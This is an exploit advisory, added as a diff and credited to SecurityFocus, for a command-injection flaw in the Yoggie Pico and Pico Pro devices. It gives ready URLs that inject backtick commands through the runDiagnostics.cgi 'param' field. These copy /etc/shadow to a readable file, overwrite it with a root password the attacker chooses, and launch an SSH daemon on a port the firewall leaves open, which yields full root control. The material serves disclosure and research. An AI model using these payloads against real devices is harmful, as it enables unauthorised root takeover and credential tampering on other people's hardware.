@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/24743/info
+
+Yoggie Pico and Pico Pro are prone to a remote code-execution vulnerability because the device fails to sufficiently sanitize user-supplied input.
+
+An attacker can exploit this issue to execute arbitrary code with superuser privileges. A successful exploit will result in the complete compromise of affected devices. 
+
+When run from a machine with a Yoggie Pico Pro connected,
+yoggie.yoggie.com resolves to the IP of the device, so these links
+will of course not work unless you have a device connected.  I didn't
+brute-force the root password, so I explain how you can replace their
+/etc/shadow to set the password to whatever you choose.
+
+To access the original /etc/shadow:
+https://yoggie.yoggie.com:8443/cgi-bin/runDiagnostics.cgi?command=Ping&param=%60cp%20/etc/shadow%20shadow.txt%60
+https://yoggie.yoggie.com:8443/cgi-bin/shadow.txt
+Replace the root password with the password of your choosing, then
+wrap the file in single quotes and urlencode the entire string.
+
+To replace the original /etc/shadow with your own:
+https://yoggie.yoggie.com:8443/cgi-bin/runDiagnostics.cgi?command=Ping&param=%60echo%20<urlencoded
+shadow file>%20%3E%20/etc/shadow%60
+
+Finally, running dropbear sshd on port 7290 (random choice -- not
+blocked by their firewall rules)
+https://yoggie.yoggie.com:8443/cgi-bin/runDiagnostics.cgi?command=Ping&param=%60/usr/sbin/dropbear%20-p%207290%60
+
+Log in as root with the password chosen, and you now have complete
+control over the device.  It's quite  powerful little computer, and a
+whole hell of a lot of fun to play around with.  A word of advice,
+though -- don't touch libc in any way, shape, or form, as there's no
+reflash mechanism I've found on the device, which is why I now have a
+bricked pico pro sitting on my desk ;)
